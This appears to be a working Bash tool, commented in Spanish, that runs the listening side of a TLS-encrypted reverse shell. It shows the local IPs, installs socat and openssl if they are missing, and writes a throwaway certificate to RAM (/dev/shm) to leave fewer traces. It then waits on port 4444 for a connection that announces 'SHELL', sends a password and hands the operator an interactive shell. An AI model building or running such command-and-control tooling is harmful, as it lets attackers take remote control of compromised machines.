#!/bin/bash
PORT=${1:-4444}
PASS=$2

if [ -z "$PASS" ]; then echo "Uso: $0 <puerto> <pass>"; exit 1; fi

# --- MOSTRAR INTERFACES DE RED (Detección por contenido de error) ---
echo -e "\e[1;34m[*] Interfaces disponibles:\e[0m"

# Capturamos stdout y stderr juntos para analizar el contenido
IP_RAW=$(ip -4 -o addr show 2>&1)

if [[ "$IP_RAW" == *"Permission denied"* ]] || [[ -z "$IP_RAW" ]] || [[ "$IP_RAW" == *"not found"* ]]; then
    # FALLBACK: Usar ifconfig si hay error de permisos o no existe 'ip'
    if command -v ifconfig &> /dev/null; then
        ifconfig 2>/dev/null | awk '/inet / {print $1 " " $2}' | grep -v "127.0.0.1" | head -n 5 | while read -r line; do
            iface=$(echo $line | awk '{print $1}' | sed 's/://')
            ip_addr=$(echo $line | awk '{print $2}' | sed 's/addr://')
            echo -e "    \e[1;33m→\e[0m $iface - $ip_addr"
        done
    else
        echo -e "    \e[1;31m[!]\e[0m No se pudo detectar IP (permisos insuficientes y no hay ifconfig)"
    fi
else
    # OK: 'ip' funcionó correctamente
    echo "$IP_RAW" | awk '{print $2 " - " $4}' | cut -d/ -f1 | grep -v "lo" | head -n 5 | while read -r line; do
        echo -e "    \e[1;33m→\e[0m $line"
    done
fi
echo ""

# --- RESTO DEL SCRIPT (Verificación y Bucle) ---
DEPS=("socat" "openssl")
for tool in "${DEPS[@]}"; do
    if ! command -v "$tool" &> /dev/null; then
        echo -e "\e[1;31m[!]\e[0m $tool no encontrado. Intentando instalar..."
        if command -v pkg &> /dev/null; then pkg install -y "$tool"
        elif command -v apt-get &> /dev/null; then sudo apt-get update && sudo apt-get install -y "$tool"; fi
    fi
done

RAM_DIR="/dev/shm"; [ ! -d "$RAM_DIR" ] && RAM_DIR="/tmp"; [ ! -w "$RAM_DIR" ] && RAM_DIR="."
CERT="$RAM_DIR/cert.pem"; KEY="$RAM_DIR/key.pem"; COMBINED="$RAM_DIR/server.pem"

openssl req -x509 -newkey rsa:4096 -keyout "$KEY" -out "$CERT" -days 1 -nodes -subj "/C=US/O=Dev/CN=localhost" 2>/dev/null
cat "$KEY" "$CERT" > "$COMBINED"
trap "rm -f $KEY $CERT $COMBINED; exit" SIGINT

while true; do
    echo -e "\e[1;32m[+]\e[0m Esperando TLS con SOCAT en puerto \e[1;33m$PORT\e[0m..."
    IDENT=$(socat -T 2 OPENSSL-LISTEN:$PORT,cert=$COMBINED,verify=0,reuseaddr - | head -n 1 | tr -d '\r\n')
    if [[ "$IDENT" == *"SHELL"* ]]; then
        echo -e "[*] Handshake: \e[1;36m$IDENT\e[0m. Validando con pass: \e[1;33m$PASS\e[0m"
        (sleep 1; echo "$PASS"; cat) | socat OPENSSL-LISTEN:$PORT,cert=$COMBINED,verify=0,reuseaddr -
    fi
done
